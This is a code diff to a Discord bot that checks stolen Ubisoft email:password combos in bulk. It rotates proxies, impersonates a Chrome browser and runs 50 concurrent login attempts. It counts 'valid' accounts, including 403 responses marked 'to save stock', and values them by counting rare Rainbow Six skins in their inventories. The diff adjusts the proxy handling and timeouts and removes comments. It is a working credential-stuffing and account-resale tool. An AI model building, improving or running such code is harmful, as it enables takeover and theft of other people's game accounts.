@@ -68,6 +68,7 @@ class Checker(commands.Cog):
         embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Type:** Ubisoft Email:Pass\n**Input:** `{account}`")
         
         proxy = random.choice(self.proxies) if self.proxies else None
+        proxies_dict = {"http": proxy, "https": proxy} if proxy else None
 
         try:
             response = requests.post(
@@ -75,8 +76,8 @@ class Checker(commands.Cog):
                 headers=headers,
                 json={"rememberMe": True},
                 impersonate="chrome",
-                proxy=proxy,
-                timeout=10
+                proxies=proxies_dict,
+                timeout=15
             )
             
             if response.status_code == 200:
@@ -115,7 +116,6 @@ class Checker(commands.Cog):
 
         email, password = account.split(":", 1)
         
-        # Fetch data using the website script logic
         try:
             from fetch_inventory import get_account_data
             result = await asyncio.to_thread(get_account_data, email, password)
@@ -136,7 +136,6 @@ class Checker(commands.Cog):
             description=f"**Profile ID:** `{profile_id}`\n**Total Items:** `{len(items)}`"
         )
         
-        # --- RARE SKIN COUNTING (Requires r6-skins-cache.json) ---
         glaciers = 0
         black_ice = 0
         
@@ -144,7 +143,6 @@ class Checker(commands.Cog):
             for item in items:
                 item_id = item.get('id')
                 if item_id in self.skin_cache:
-                    # Handle both dict and string formats in cache
                     cache_entry = self.skin_cache[item_id]
                     skin_name = cache_entry.get('name', '') if isinstance(cache_entry, dict) else str(cache_entry)
                     
@@ -184,7 +182,7 @@ class Checker(commands.Cog):
         await interaction.followup.send(f"⏳ Checking **{total}** accounts...", ephemeral=True)
 
         valid_accounts = []
-        sem = asyncio.Semaphore(50) # Limit to 50 concurrent checks
+        sem = asyncio.Semaphore(50) 
         
         async def test_account(acc):
             async with sem:
@@ -205,6 +203,7 @@ class Checker(commands.Cog):
                 }
 
                 proxy = random.choice(self.proxies) if self.proxies else None
+                proxies_dict = {"http": proxy, "https": proxy} if proxy else None
                 
                 try:
                     response = requests.post(
@@ -212,16 +211,16 @@ class Checker(commands.Cog):
                         headers=headers,
                         json={"rememberMe": True},
                         impersonate="chrome",
-                        proxy=proxy,
-                        timeout=10
+                        proxies=proxies_dict,
+                        timeout=15
                     )
                     
                     if response.status_code == 200:
                         valid_accounts.append(acc)
                     elif response.status_code == 401:
-                        pass # Dead
+                        pass
                     elif response.status_code == 403:
-                        valid_accounts.append(acc) # Assume valid to save stock
+                        valid_accounts.append(acc)
                 except Exception:
                     valid_accounts.append(acc)
 
